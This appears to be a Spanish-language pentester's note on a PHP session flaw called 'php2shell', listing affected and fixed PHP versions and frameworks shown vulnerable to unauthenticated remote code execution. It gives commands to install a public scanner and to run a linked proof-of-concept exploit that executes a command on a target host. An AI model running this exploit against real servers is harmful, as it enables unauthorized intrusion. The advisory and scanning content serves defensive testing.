# PHP

Tags: #Linux #PHP 

PHP es un lenguaje de programación que se utiliza principalmente para desarrollar aplicaciones web del lado del servidor. Es decir, permite que una página web no solo muestre información, sino que también procese datos, gestione usuarios, consulte bases de datos y ejecute acciones.

|Rama de PHP|Versiones afectadas|Versión corregida|
|---|---|---|
|PHP 8.5|8.5.0–8.5.11|8.5.12|
|PHP 8.4|8.4.0–8.4.26|8.4.27|
|PHP 8.3|8.3.0–8.3.35|8.3.36|
|PHP 8.2|8.2.0–8.2.34|8.2.35

### Impacto en aplicaciones basadas en PHP

Wiz demostró ejecución remota de código (RCE) sin autenticación en imágenes de contenedor estándar de las siguientes plataformas:

| Plataforma | ¿Vulnerable? | Observaciones                                                                                                                           |
| ---------- | ------------ | --------------------------------------------------------------------------------------------------------------------------------------- |
| WordPress  | Sí           | El núcleo no utiliza sesiones PHP de forma predeterminada, pero WooCommerce y muchos plugins sí las utilizan.                           |
| Joomla     | Sí           | Utiliza sesiones nativas de PHP de forma predeterminada.                                                                                |
| Drupal     | Sí           | Utiliza sesiones nativas de PHP de forma predeterminada.                                                                                |
| Magento    | Sí           | Puede ser vulnerable incluso en modo de mantenimiento.                                                                                  |
| Laravel    | Sí           | `PendingBroadcast` es un gadget conocido asociado al método mágico `__destruct()`, que puede formar parte de una cadena de explotación. |

## Scanner 
* [Scanner](https://github.com/assetnote/php2shell-scanner)
```bash 
# Instalación 
❯ git clone https://github.com/assetnote/php2shell-scanner.git && cd php2shell-scanner && python3 -m venv .venv && source .venv/bin/activate && python -m pip install --upgrade pip && python -m pip install -r requirements.txt
```

```bash 
❯ python3 scanner.py -u http://IP
```

## Php2shell - RCE 
* [PoC](https://github.com/ikow/php2shell-poc)
```bash 
❯ git clone https://github.com/ikow/php2shell-poc
```

```bash 
❯ python3 chain_a_session_lfi.py --host IP --port 80 --command 'pwd'
```

